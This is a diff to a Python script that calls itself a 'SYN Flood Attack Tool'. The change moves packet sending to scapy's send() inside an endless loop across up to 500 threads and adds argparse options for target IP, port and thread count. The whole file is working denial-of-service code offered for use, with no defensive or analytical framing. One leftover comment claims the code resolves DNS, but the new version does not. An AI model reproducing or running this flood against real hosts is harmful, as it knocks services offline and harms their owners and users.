@@ -1,7 +1,6 @@
-import socket
+import argparse
 import threading
-import sys
-from scapy.all import IP, TCP
+from scapy.all import IP, TCP, send
 
 # SYN flood attack function
 def syn_flood(target, port, threads):
@@ -11,42 +10,30 @@ def syn_flood(target, port, threads):
     # Craft SYN packet
     ip = IP(dst=target)
     tcp = TCP(sport=1234, dport=port, flags='S')
-    packet = ip/tcp
+    packet = ip / tcp
 
     try:
         while True:
-            # Send SYN packet
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            sock.sendto(bytes(packet), (target, port))
+            # Send SYN packet using scapy's send function
+            send(packet, verbose=0)
     except Exception as e:
         print("Error sending SYN packet:", str(e))
 
-# Input handling
+def main():
+    parser = argparse.ArgumentParser(description="SYN Flood Attack Tool")
+    parser.add_argument("target", help="Target IP address")
+    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
+    parser.add_argument("--threads", type=int, default=500, help="Number of threads (default: 500)")
+    
+    args = parser.parse_args()
 
-# Get target and port
-if len(sys.argv) < 2:
-    print("Usage: python syn_flood.py <target_ip> [port] [threads]")
-    sys.exit(1)
+    # Resolve target DNS name
+    target_ip = args.target
 
-target = sys.argv[1]
-port = 80
+    # Launch SYN flood threads
+    for _ in range(args.threads):
+        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port, args.threads))
+        thread.start()
 
-if len(sys.argv) > 2:
-    port = int(sys.argv[2])
-
-# Get thread count
-threads = 500
-if len(sys.argv) > 3:
-    threads = int(sys.argv[3])
-
-# Resolve target DNS name
-try:
-    target_ip = socket.gethostbyname(target)
-except socket.gaierror as e:
-    print("Error resolving target:", str(e))
-    sys.exit(1)
-
-# Launch SYN flood threads
-for _ in range(threads):
-    thread = threading.Thread(target=syn_flood, args=(target_ip, port, threads))
-    thread.start()
+if __name__ == "__main__":
+    main()
